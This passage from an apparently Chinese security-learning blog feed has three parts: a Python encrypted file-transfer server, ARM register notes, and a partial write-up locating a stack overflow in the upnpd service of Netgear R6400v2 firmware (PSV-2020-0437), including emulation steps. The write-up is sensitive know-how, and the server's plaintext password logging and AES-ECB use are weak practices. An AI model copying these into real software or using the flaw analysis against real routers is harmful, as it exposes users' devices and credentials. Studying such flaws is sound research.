data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    value = verify_md5(data,data_md5)</span><br><span class="line">    if value == False:</span><br><span class="line">        fail_number = sliced_num</span><br><span class="line">    else:</span><br><span class="line">        fail_number = None</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data,fail_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,query_thread1,addr,log_file):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    en_data = (sock.recv(1024))</span><br><span class="line">    if len(en_data) == 0:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    data = decrypt_data(shared_key,en_data)</span><br><span class="line">    parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">    username = parts[0].decode()</span><br><span class="line">    password = parts[1].decode()</span><br><span class="line">    result = query_thread1.query_username(username)</span><br><span class="line">    if result != None:</span><br><span class="line">        result = query_thread1.query_password(username,password)</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1    </span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0    </span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            return permission_value,username</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3,username</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3,username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data,log_file):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data,addr,log_file):  #处理非切片数据</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;text/plain&quot;:</span><br><span class="line">            filename += &quot;.txt&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        else :</span><br><span class="line">            print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data_bytes,addr,log_file,fail_array): #处理切片数据</span><br><span class="line">    </span><br><span class="line">    if len(fail_array)&gt;0:</span><br><span class="line">        fail_meg = &quot;,&quot;.join(fail_array)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125; 数据疑似遭到篡改&quot;)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.close()</span><br><span class="line">        return</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;)</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;image/png&quot;:</span><br><span class="line">            filename += &quot;.png&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">            filename += &quot;.mp3&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line">    </span><br><span class="line">def deal_data(shared_key,text,sliced_num,type1,type2,type3,data_bytes,fail_array):</span><br><span class="line">    try:</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,fail_number = unpack_data(shared_key,text)</span><br><span class="line">        data_bytes.append(data)</span><br><span class="line">        if fail_number is not None:</span><br><span class="line">            fail_array.append(fail_number)</span><br><span class="line">        if data_type == 1:</span><br><span class="line">            type1.append(&quot;1&quot;)</span><br><span class="line">        elif sliced_num==1 and sliced_sum ==1 and data_type == 2:</span><br><span class="line">            type2.append(&quot;1&quot;)</span><br><span class="line">        elif data_type == 2:</span><br><span class="line">            type3.append(&quot;1&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;第&#123;sliced_num&#125;组数据处理有问题 报错:&#123;e&#125;&quot;)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;错误切片长度为&#123;len(text)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,data,query_thread1,log_file,addr,login_username):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0].decode()</span><br><span class="line">        password = parts[1].decode()</span><br><span class="line">        try:</span><br><span class="line">            query_thread1.add_user(sock,username,password,addr,login_username,log_file)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1):</span><br><span class="line">    addr = format(addr[0])</span><br><span class="line">    log_name = &quot;logfile/&quot;+addr+&quot;-log&quot;</span><br><span class="line">    try:</span><br><span class="line">        log_file = open(log_name,&#x27;ab+&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;连接成功&quot;</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line">    </span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    public_key_client = key_switch(sock,public_key_server)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;)</span><br><span class="line">    permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file)</span><br><span class="line">    if permission_value == 3:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;)</span><br><span class="line">    </span><br><span class="line">    pool = ThreadPoolExecutor(max_workers=10)</span><br><span class="line">    </span><br><span class="line">    while 1:</span><br><span class="line">        fail_array = []</span><br><span class="line">        sliced_num = 1</span><br><span class="line">        sliced_sum = 1</span><br><span class="line">        data_list = []</span><br><span class="line">        count = 0</span><br><span class="line">        unpack_text = []</span><br><span class="line">        wrong_number = []</span><br><span class="line">        futures = []</span><br><span class="line">        </span><br><span class="line">        type1 = []</span><br><span class="line">        type2 = []</span><br><span class="line">        type3 = []</span><br><span class="line"></span><br><span class="line">        #先接收数据 再统一处理</span><br><span class="line">        while sliced_num &lt;= sliced_sum:</span><br><span class="line">            text = sock.recv(1084)</span><br><span class="line">            if len(text) == 0:</span><br><span class="line">                print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;中断连接&quot;)</span><br><span class="line">                text = f&quot;客户机中断连接&quot;</span><br><span class="line">                write_log(log_file,text)</span><br><span class="line">                sock.close()</span><br><span class="line">                return</span><br><span class="line">            elif len(text) != 1084:</span><br><span class="line">                if sliced_sum != sliced_num:</span><br><span class="line">                    wrong_number.append(sliced_num)</span><br><span class="line">            unpack_text.append(text)</span><br><span class="line">            if count == 0:</span><br><span class="line">                sliced_sum,sliced_num,_,_,_ = unpack_data(shared_key,text)</span><br><span class="line">                sliced_num += 1</span><br><span class="line">                count = 1</span><br><span class="line">            else :</span><br><span class="line">                sliced_num += 1</span><br><span class="line">        </span><br><span class="line">        #判断切片大小是否符合 否则记录第一个不合格的切片编号</span><br><span class="line">        while 1:</span><br><span class="line">            if len(wrong_number) != 0:</span><br><span class="line">                while True:  #清空缓存区</span><br><span class="line">                    try:</span><br><span class="line">                        sock.settimeout(0.5)</span><br><span class="line">                        data = sock.recv(1084)</span><br><span class="line">                    except socket.timeout:</span><br><span class="line">                        break</span><br><span class="line">                    finally:</span><br><span class="line">                        sock.settimeout(None)</span><br><span class="line">                wrong = wrong_number[0]</span><br><span class="line">                text = f&quot;第[&#123;wrong&#125;]组切片传输发生错误 需要进行重传&quot;</span><br><span class="line">                try:</span><br><span class="line">                    write_log(log_file,text)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    print(e)</span><br><span class="line">                sock.send(text.encode())</span><br><span class="line">                print(f&quot;&#123;threading.current_thread().name&#125;&quot;+text)</span><br><span class="line">                sliced_num = wrong_number[0]</span><br><span class="line">                wrong_number.clear()</span><br><span class="line">                while sliced_num &lt;= sliced_sum:</span><br><span class="line">                    text = sock.recv(1084)</span><br><span class="line">                    if len(text) != 1084:</span><br><span class="line">                        if sliced_sum != sliced_num:</span><br><span class="line">                            wrong_number.append(sliced_num)</span><br><span class="line">                    unpack_text[sliced_num-1] = text</span><br><span class="line">                    sliced_num += 1</span><br><span class="line">                if len(wrong_number) != 0:</span><br><span class="line">                    continue</span><br><span class="line">                else:</span><br><span class="line">                    break</span><br><span class="line">            else :</span><br><span class="line">                break</span><br><span class="line">        </span><br><span class="line">        if sliced_sum &lt;= 1:</span><br><span class="line">            pool.submit(deal_data,shared_key,unpack_text[0],sliced_num,type1,type2,type3,data_list,fail_array)</span><br><span class="line">        else:</span><br><span class="line">            for i in range(sliced_sum):</span><br><span class="line">                try:</span><br><span class="line">                    future = pool.submit(deal_data,shared_key,(unpack_text[i]),sliced_num,type1,type2,type3,data_list,fail_array)</span><br><span class="line">                    futures.append(future)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    print(e)        </span><br><span class="line">        </span><br><span class="line">        for future in futures:</span><br><span class="line">            future.result()</span><br><span class="line">        </span><br><span class="line">        data_bytes = b&quot;&quot;.join(data for data in data_list)</span><br><span class="line">        </span><br><span class="line">        if len(type1) == sliced_sum:</span><br><span class="line">            transfer_txt(addr,data_bytes,log_file)</span><br><span class="line">        elif len(type2) == sliced_sum:</span><br><span class="line">            transfer_file(sock,data_bytes,addr,log_file)</span><br><span class="line">        elif len(type3) == sliced_sum:</span><br><span class="line">            transfer_file2(sock,data_bytes,addr,log_file,fail_array)</span><br><span class="line">        else :</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:传输过程中 data_type疑似被篡改或者发生丢包&quot;)</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    pool = ThreadPoolExecutor(max_workers=5)   #定义一个线程池 拥有5个空闲线程</span><br><span class="line">    query_thread1 = query_thread()  #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定</span><br><span class="line">    s.bind((&quot;192.168.220.130&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;)</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="添加个人界面ui以及好友系统"><a href="#添加个人界面ui以及好友系统" class="headerlink" title="添加个人界面ui以及好友系统"></a>添加个人界面ui以及好友系统</h3><p>这一版本主要是添加一下个人界面的ui设计以及好友系统<br>好友系统的实现 目前是打算客户端这边显示好友列表之前 先向服务端发送请求 服务端根据客户端登录的user来查询存储于数据库中的好友列表并且返回<br>然后就是完善了一下程序运行环境的配置 使得用户使用起来更加方便<br>目前的进度是卡在了用户头像的设置 设想是客户端本地缓存 如果需要更换头像 则传输至服务端 这样在客户端之间互相通讯的时候 可以及时更新</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>arm架构学习</title>
    <link href="http://example.com/2024/10/10/arm%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/10/10/arm%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-10T02:51:26.000Z</published>
    <updated>2024-10-26T03:39:07.264Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>与先前学过的inter指令集不同的是 arm采用的是精简指令集 虽然可以更快的执行指令 但是由于指令较少 因此在实现功能的时候会比inter更加繁琐<br>x86架构中 可以直接对内存数据进行操作 但是在arm架构中 只能通过寄存器来中转 先将内存中的数据存入寄存器再操作 这一点类似8086<br>arm架构下 又可以细分为armel和armhf 这是在32位下 至于64位 则都是采用armhf<br>二者的区别在于浮点运算上 他们在浮点运算时都会使用fpu寄存器 但是前者在传参的时候会使用普通寄存器 而后者在传参时则会使用fpu寄存器 所以armhf的浮点运算能力更强<br>ARM一共有37个寄存器 其中31个32位的通用寄存器 以及6个32位的状态寄存器<br>ARM处理器一共有7种模式<br>用户模式(usr)：ARM处理器正常的程序执行状态。非特权模式。<br>快速中断模式(fiq)：用于高速数据传输或通道处理。<br>外部中断模式(irq)：用于通用的中断处理。<br>管理模式(svc)：操作系统使用的保护模式。<br>数据访问终止模式(abt)：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。<br>系统模式(sys)：运行具有特权的操作系统任务。<br>定义指令中止模式(und)：当未定义的指令执行时进入该模式，可用于支持硬件协处理器的软件仿真。<br>任意处理器模式下 可使用的寄存器包含15个通用寄存器 即R0-R14还有程序计数器PC以及一两个状态寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410242219483.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410242219483.png" alt="image.png"></a><br>R0寄存器可以用于存储临时值 也用于存储函数调用后的返回值<br>R0~R3寄存器就负责存储调用函数的参数<br>R7寄存器用于存储系统调用号 (这一点倒是比x86做的好 x86的rax寄存器又是存储函数返回值又是存储系统调用号的 可以通过read函数来控制rax寄存器的值 然后就可以自定义系统调用号<br>R11寄存器用来存储回溯信息 也可以作为局部变量 (这里的回溯信息有点疑惑是具体指什么 如果是用来返回父函数的 又和LR寄存器冲突 希望下面的研究能够了解一下<br>R13寄存器就是堆栈指针 指向堆栈的顶部<br>R14寄存器类似于rbp寄存器 存储调用函数的下一条指令 供子函数返回父函数<br>PC寄存器类似于rip寄存器 存储当前执行的目标地址 不过要特别注意的是 arm架构的pc寄存器会存储当前执行的目标地址+8 (这里具体的数值待研究 不清楚32位和64位架构是否都是8)</p><h1 id="编译并运行一个arm架构的二进制文件"><a href="#编译并运行一个arm架构的二进制文件" class="headerlink" title="编译并运行一个arm架构的二进制文件"></a>编译并运行一个arm架构的二进制文件</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>PSV-2020-0437漏洞复现</title>
    <link href="http://example.com/2024/09/21/psv-2020-0437%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2024/09/21/psv-2020-0437%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-09-21T01:53:17.000Z</published>
    <updated>2024-10-10T02:31:45.475Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>本次漏洞复现 所选择的设备为 Netgear R6400v2 固件版本为1.0.4.102<br>参照文章 <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html</a><br>固件下载地址 <a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip</a></p><h1 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h1><p>这里下载到的固件是zip压缩文件 unzip解压后 发现需要被提取的文件格式是chk<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409211004578.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409211004578.png" alt="image.png"></a><br>其通常是程序或者工具生成的检查点或者状态文件<br>不过还是照常使用binwalk提取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me R6400v2-V1.0.4.102_10.0.75.chk</span><br></pre></td></tr></table></figure><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>先使用firmwalker工具来大致的了解固件中可能存在的漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ../iot/_R6400v2-V1.0.4.102_10.0.75.chk.extracted/squashfs-root ../firmwalker.txt</span><br></pre></td></tr></table></figure><p>发现存在了telnet服务 联想到之前复现过的一个cve是通过越权开启telnet 同时存在硬编码的账密<br>不过这题是否存在这个问题 还需要后续的挖掘<br>先步入到usr&#x2F;sbin目录中 查看该固件涉及到的协议<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231037427.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231037427.png" alt="image.png"></a><br>存在httpd和upnpd 其中upnpd所存在的漏洞相对较多 这里先重点分析一下<br>32位小端序的arm架构 使用ida32查看反汇编代码<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231038336.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231038336.png" alt="image.png"></a><br>自己看了main函数后 没发现什么端倪 于是查看了教程 发现是通过recvfrom函数来定位漏洞函数的<br>该函数基于套接字来传输 所以利用这个函数来查找可以由我们输入的数据引发的漏洞确实是一个好思路 学到了<br>依靠交叉索引定位到sub_1B0E0函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231125486.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231125486.png" alt="image.png"></a><br>这里可以往v50数组中读入0x1fff的数据 下面存在一个if判断<br>如果upnp_turn_on的值为1 并且输入的数据小于0x100字节 就可以进入sub_23FB0函数 v50数组作为a1参数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231454706.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231454706.png" alt="image.png"></a><br>在该函数一开始 利用strncpy将a1的数据复制给了v39 同时v41指针指向v39<br>带着v42参数一起进入了sub_B9EC函数<br>这个函数用于在v41中查找v42字符串 同时返回v41包含该字串的下一个字节的地址<br>结合下面的代码 可以看出这里是在针对a1数组中的数据进行参数数值的提取<br>92行出现了一个新的函数sub_22D20<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231500111.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231500111.png" alt="image.png"></a><br>这个函数中也存在strncpy函数 观察一下拷贝的字节长度是否能够达到栈溢出<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231525169.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231525169.png" alt="image.png"></a><br>首先是在a1字符串里查找MX: 然后再次查找\r\n<br>同时对于位置进行了检测 确保\r\n位于MX:的后三个字节开外<br>strncpy函数复制字节的长度为 v5-(v4+3) 也就是靠\r\n来决定复制的长度<br>而v7数组的长度显然小于可以复制的长度 所以这里存在栈溢出</p><h1 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h1><p>这里使用qemu来进行系统模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap1 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig tap1 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd ./armhf/initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic -net tap,ifname=tap1,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随后进入模拟机中配置eth0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.6.10</span><br></pre></td></tr></table></figure><p>然后用scp传输squashfs-root文件夹到模拟机中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf 1.tar ./squashfs-root</span><br><span class="line">scp 1.tar root@192.168.6.10:/root</span><br><span class="line">tar -xvf 1.tar</span><br></pre></td></tr></table></figure><p>随后挂载目录 准备运行upnp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></table></figure><p>直接运行upnpd发现并没有回显<br>这是因为NVRAM(非易失性RAM)用于存储路由器的配置信息 upnpd运行时需要用到其中部分的信息 在没有实体硬件的情况下 这里使用LD_PRELOAD环境变量来引导<br>这里使用这个项目来帮助我们搭建环境<br><a href="https://github.com/therealsaumil/custom_nvram">https://github.com/therealsaumil/custom_nvram</a><br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091826169.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091826169.png" alt="image.png"></a><br>这里直接使用项目中已经编译好的nvram.so文件<br>接下来执行下面指令 看看是否能够运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LD_PRELOAD=&quot;/custom_nvram_r6250.so&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>遇到了第二个报错 缺少libc.so.6<br><a 